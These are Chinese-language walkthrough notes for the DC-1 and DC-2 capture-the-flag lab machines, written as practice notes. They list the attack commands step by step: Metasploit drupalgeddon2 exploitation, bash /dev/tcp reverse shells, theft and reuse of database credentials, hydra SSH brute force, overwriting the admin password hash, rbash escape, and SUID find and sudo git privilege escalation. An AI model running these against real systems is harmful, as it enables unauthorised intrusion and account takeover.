#### DC1

##### 信息搜集

>       > **namp**
>       >
>       > nmap -sP 192.168.64.0/24	#扫描主机
>       >
>       > nmap -F 192.168.64.128		#扫描目标主机开放的常用端口



##### MFS

>       > search drupal
>       >
>       > use exploit/unix/webapp/drupal_drupalgeddon2	#选择模块
>       >
>       > set payload php/meterpreter/reverse_tcp	#设置攻击载荷
>       >
>       > set RHOSTS 192.168.64.128	#目标主机
>       >
>       > set LHOST 192.168.64.5		#本地主机
>       >
>       > exploit

##### flag2

> cat sites/default/settings.php 	#寻找网站配置信息
>
> ```
> 'database' => 'drupaldb',
> 
> 'username' => 'dbuser',
> 
> 'password' => 'R0ck3t',
> 
> 'host' => 'localhost',
> ```

##### shell

> shell #进入交互界面
>
> mysql -udbuser -pR0ck3t	#登录数据库失败
>
> **考虑反弹shell**
>
> > nc -lvvp 1234	#**本地监听1234端口**
> >
> > bash -i >& /dev/tcp/192.168.64.5 1234 0>&1	#目标主机把**bash **重定向192.168.64.5的1234端口 #**失败**
> >
> > **借助python 反弹**
> >
> > python -c 'import pty;pty.spawn("/bin/bash")'	#目标主机运行
> >
> > bash -i >& /dev/tcp/192.168.1.150/2333 0>&1	#目标主机运行，反弹成功
> >
> > www-data@DC-1:/var/www/sites/default$ mysql -udbuser -pR0ck3t	#登录数据库成功

##### mysql

> show databases;
>
> use drupladb;
>
> select \*  from users\;
>
> **退出数据库生成替换的密码**
>
> > ![image-20210416162221426](C:\Users\86184\AppData\Roaming\Typora\typora-user-images\image-20210416162221426.png) 
> >
> > **php scripts/password-hash.sh admin**	生成hash密码
> >
> > ​		password: admin         hash: $S$D9/EB/sN8TEfNaCZ74SqGVO0xxuOe/8fZI3LCOMVXSOqiqfNDwDt
>
> **数据库替换admin原有的密码**
>
> >  update users set pass="$S$D9/EB/sN8TEfNaCZ74SqGVO0xxuOe/8fZI3LCOMVXSOqiqfNDwDt" where uid=1;

##### flag4

> **进行密码爆破**
>
> >  hydra -l flag4 -P /usr/share/john/password.lst 192.168.64.128 ssh -vV -f -o hydra.ssh
>
> **登录**
>
> > ssh flag4@192.168.64.128
> >
> > 密码:orange

##### 提权

> find / -perm -4000 2>/dev/null	#是否有一些命令具有SUID 标志
>
> **利用系统内核提权**
>
> > mkdir GGG
> >
> > find GGG -exec "whoami" \;
> >
> > find GGG -exec "/bin/sh" \;

##### 解除账户登录次数限制

> **数据库中运行**
>
> truncate flood;

#### DC2

##### 信息搜集

> >       > **namp**
> >       >
> >       > > nmap -sP 192.168.64.0/24	#扫描主机
> >       > >
> >       > > nmap -F 192.168.64.132		#扫描目标主机开放的常用端口
> >       >
> >       > #因为对目标网站进行了重定向所有添加hosts文件
> >       >
> >       > vim /etc/hosts		192.168.64.132 	dc-2
> >       >
> >       > **cewl**	##对网站页面进行信息收集并生成字典
> >       >
> >       > >  cewl dc-2 >pwd.dic
> >       >
> >       > **目录扫描**
> >       >
> >       > > **MSF**
> >       > >
> >       > > > use auxiliary/scanner/http/dir_scanner
> >       > > >
> >       > > > set RHOSTS 192.168.1.162
> >       > > >
> >       > > > set THREADS 50
> >       > > >
> >       > > > exploit
> >       > >
> >       > > **御剑**
> >       > >
> >       > > > http://192.168.64.132/
> >       > > >
> >       > > > 线程20
> >       >
> >       > **wpscan工具**
> >       >
> >       > > 因为网站的cms是wordpress,wpscan是专门扫描wordpress
> >       > >
> >       > > wpscan --update	#更新
> >       > >
> >       > > wpscan --url dc-2 -e u	#扫描这个网站的用户
> >       > >
> >       > > vim user.dic	#admin jerryy tom
> >       > >
> >       > > wpscan --url dc-2 -U user.dic -P pwd.dic	#进行爆破

##### 爆破

> hydra -L user.dic -P pwd.dic ssh://192.168.1.162 -s 7744 -o hydra.ssh -vV
>
> ssh tom@192.168.1.162 -p 7744	#登录

##### Rbash绕过

> BASH_CMDS[a]=/bin/sh;a
>
> /bin/bash
>
> export PATH=$PATH:/bin/
>
> export PATH=$PATH:/usr/bin

##### flag4

> su jerry
>
> sudo -l

##### git提权

> sudo git -p --help -a
>
> !/bin/bash







